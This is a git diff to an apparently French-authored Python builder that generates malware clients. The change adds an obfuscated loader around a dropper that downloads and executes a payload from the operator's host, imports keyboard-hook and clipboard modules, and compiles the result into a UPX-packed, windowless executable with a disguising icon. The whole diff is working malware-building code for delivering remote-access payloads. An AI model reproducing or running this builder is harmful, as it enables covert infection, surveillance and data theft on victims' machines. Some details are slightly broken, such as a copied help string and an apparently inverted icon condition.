@@ -50,6 +50,13 @@ parser.add_argument('--obf',
                     dest='obf',
                     default=False,
                     help='obfusque le code python')
+parser.add_argument('--icon',
+                    action='store_const',
+                    const=True,
+                    required=False,
+                    dest='icon',
+                    default=False,
+                    help='obfusque le code python')
 
 args = parser.parse_args()
 
@@ -59,7 +66,13 @@ class GenClient:
     pathDirOutput = "./output/"
     pathDirHttp = "./http/"
 
-    def GenererClient(self, ip, port, persistance, name, freeze, obf):
+    def GenererClient(self, ip, port, persistance, name, freeze, obf, icon):
+        fin_dropeur = """)))))
+    except Exception as e:
+        print(str(e))
+        time.sleep(5*60)"""
+        debut_loader = "import base64,sys,zlib,marshal,json,urllib,pythoncom,pyHook,win32clipboard,win32com,uuid,time,os;from win32com.makegw.makegwparse import*;from ctypes import*;from urllib import request;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]("
+        fin_loader = ")))"
         # definir url du payload
         url = "\"http://" + ip + ":" + str(port + 1) + "/" + name + ".pyw\""
         # creer les dossier outpu et http si il n'éxiste pas
@@ -79,30 +92,40 @@ class GenClient:
         # ecrire le dropeur dans output
         fichier = open(self.pathDirOutput + "drop_" + name + ".pyw", "w")
         ## import sys,zlib,base64,marshal,json,urllib
-        dropper = self.ReturnFichier("dropeur.txt") + "{}".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format(url),2))))) + ")))))"
+        dropper = self.ReturnFichier("dropeur.txt") + "{}".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format(url),2))))) + fin_dropeur
         fichier.write(dropper)
         fichier.close()
         # obfusqué le droppeur
         if obf:
             os.system("pyminifier --obfuscate-classes -o " + self.pathDirOutput + "drop_" + name + ".pyw" + " " + self.pathDirOutput + "drop_" + name + ".pyw")
+        # ecrire le loader dans output
+        fichier = open(self.pathDirOutput + "load_" + name + ".pyw", "w")
+        drop_txt = str(base64.b64encode(open(self.pathDirOutput + "drop_" + name + ".pyw", "r").read().encode('utf-8')))[1:]
+        fichier.write(debut_loader + drop_txt + fin_loader)
+        fichier.close()
         # si l'options freeze est choisi
         if freeze:
-            ## Complier le droppeur
-            os.system("C:/Users/theoc/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe " + self.pathDirOutput + "drop_" + name + ".pyw" + " -F --clean")
+            ## Complier le loader
+            if icon:
+                os.system("C:/Users/theoc/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe " + self.pathDirOutput + "load_" + name + ".pyw" + " --upx-dir C:\\Users\\theoc\\Downloads\\upx-3.96-win64\\upx-3.96-win64 --clean -y --onefile --noconsole")
+            else:
+                os.system("C:/Users/theoc/AppData/Local/Programs/Python/Python37/Scripts/pyinstaller.exe " + self.pathDirOutput + "load_" + name + ".pyw" + " --upx-dir C:\\Users\\theoc\\Downloads\\upx-3.96-win64\\upx-3.96-win64 --clean -y --onefile --noconsole --icon C:\\Users\\theoc\\Downloads\\icon.ico")
             print("Compilation terminer")
             print("Nettoyage des fichier temporaire")
             # netoyyer fichier temporaire
             if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
                 os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
-            if os.path.exists("drop_" + name + ".spec"):
-                os.remove("drop_" + name + ".spec")
-            shutil.copyfile("dist/" + "drop_" + name + ".exe", self.pathDirOutput + name + ".exe")
+            if os.path.exists(self.pathDirOutput + "load_" + name + ".pyw"):
+                os.remove(self.pathDirOutput + "load_" + name + ".pyw")
+            if os.path.exists("load_" + name + ".spec"):
+                os.remove("load_" + name + ".spec")
+            shutil.copyfile("dist/" + "load_" + name + ".exe", self.pathDirOutput + name + ".exe")
             shutil.rmtree("dist/")
             shutil.rmtree("build/")
             shutil.rmtree("output/__pycache__")
             print("Client executable prêt : output/" + name + ".exe")
         else:
-            print("Client prêt : output/" + "drop_" + name + ".pyw")
+            print("Client prêt : output/" + "load_" + name + ".pyw")
 
         
 
@@ -113,5 +136,5 @@ class GenClient:
         return text
         
 
-GenClient().GenererClient(args.host, args.port, args.persistance, args.name, args.freeze, args.obf)
+GenClient().GenererClient(args.host, args.port, args.persistance, args.name, args.freeze, args.obf, args.icon)
 
